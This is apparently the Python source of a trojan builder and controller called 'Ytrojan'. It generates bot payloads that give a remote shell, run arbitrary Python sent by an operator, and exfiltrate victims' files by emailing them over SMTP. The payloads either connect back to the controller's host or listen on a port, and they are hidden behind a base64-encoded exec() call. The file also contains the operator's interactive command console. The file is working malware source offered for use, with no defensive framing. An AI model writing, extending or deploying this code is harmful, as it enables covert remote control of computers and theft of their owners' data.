#2022/09/03
#github.com/ycy20090311/Ytrojan

import socket
import base64

botcodes = {
    "shell":[
        "import subprocess",
        """
            %s recvmsg[0] == "shell" and len(recvmsg) != 1:
                try:
                    shell = subprocess.Popen(recvmsg[1],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                    sendmsg = f"{shell.stdout.read().decode()}{shell.stderr.read().decode()}"
                    if sendmsg == "":sendmsg = "YES"
                except:
                    sendmsg = "NO"        
        """
    ],"pycmd":[
        "",
        """
            %s recvmsg[0] == "pycmd" and len(recvmsg) != 1:
                try:
                    exec(recvmsg[1])
                except:
                    sendmsg = "NO"
        """
    ],"getfile":[
        """
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
        """,
        """
            %s recvmsg[0] == "getfile" and len(recvmsg) != 1:
                try:
                    emailmsg = MIMEMultipart()
                    file = MIMEText(open(recvmsg[1],"rb").read(),"base64","utf-8")
                    file["Content-Type"] = "application/octet-stream"
                    file["Content-Disposition"] = f"attachment;filename={recvmsg[1]}"
                    emailmsg.attach(file)
                    smtp = smtplib.SMTP()
                    smtp.connect(host,port)
                    smtp.login(username,password)
                    smtp.sendmail(username,username,emailmsg.as_string())
                    smtp.close()
                except:
                    sendmsg = "NO"
        """
    ]
}

def generate(i:int,src:str,ip:str,port:int,parameters:list[str]) -> None:
    botcode = "import socket\n"
    if i == 0:
        for parameter in parameters:
            botcode += botcodes[parameter][0]
        botcode += f"""
if "__main__" == __name__:
    global host,port,username,password
    botsocket = socket.socket()
    try:
        botsocket.connect(("{ip}",{str(port)}))
        while True:
            recvmsg = botsocket.recv(2048).decode().split(" ",1)
            sendmsg = "YES"
        """
        botcode += botcodes[parameters[0]][1] % "if"
        for parameter in parameters[1:len(parameters)]:
            botcode += botcodes[parameter][1] % "elif"
        botcode += """
            else:
                sendmsg = "NO"
            botsocket.send(sendmsg.encode())
    except:
        exit(0)
        """
    elif i == 1:
        for parameter in parameters:
            botcode += botcodes[parameter][0]
        botcode += f"""
if "__main__" == __name__:
    global host,port,username,password
    botsocket = socket.socket()
    try:
        botsocket.bind(("{ip}",{str(port)}))
        botsocket.listen()
        controlsocket,addr = botsocket.accept()
        while True:
            recvmsg = controlsocket.recv(2048).decode().split(" ",1)
            sendmsg = "YES"
        """
        botcode += botcodes[parameters[0]][1] % "if"
        for parameter in parameters[1:len(parameters)]:
            botcode += botcodes[parameter][1] % "elif"
        botcode += """
            else:
                sendmsg = "NO"
            controlsocket.send(sendmsg.encode())
    except:
        exit(0)
        """
    file = open(src,"w+")
    file.write(f"""
import base64;exec(base64.b64decode({base64.b64encode(botcode.encode())}))
    """)
    file.close()

class Control:
    
    def __init__(self,ip:str,port:int) -> None:
        self.controlsocket = socket.socket()
        self.ip = ip
        self.port = port

    def connect(self) -> None:
        try:
            self.controlsocket.connect((self.ip,self.port))
            while True:
                sendmsg = input(f"{self.ip} $>")
                if sendmsg == "":
                    print("Don't send empty cmd!")
                else:
                    self.controlsocket.send(sendmsg.encode())
                    recvmsg = self.controlsocket.recv(2048).decode()
                    print(recvmsg)
        except:
            print("botsocket close!")
            self.controlsocket.close()

    def listen(self) -> None:
        try:
            self.controlsocket.bind((self.ip,self.port))
            self.controlsocket.listen()
            print(f"Listening port {self.port}")
            botsocket,addr = self.controlsocket.accept()
            while True:
                sendmsg = input(f"{addr[0]} $>")
                if sendmsg == "":
                    print("Don't send empty cmd!")
                else:
                    botsocket.send(sendmsg.encode())
                    recvmsg = botsocket.recv(2048).decode()
                    print(recvmsg)
        except:
            print("botsocket close!")
            self.controlsocket.close()

            
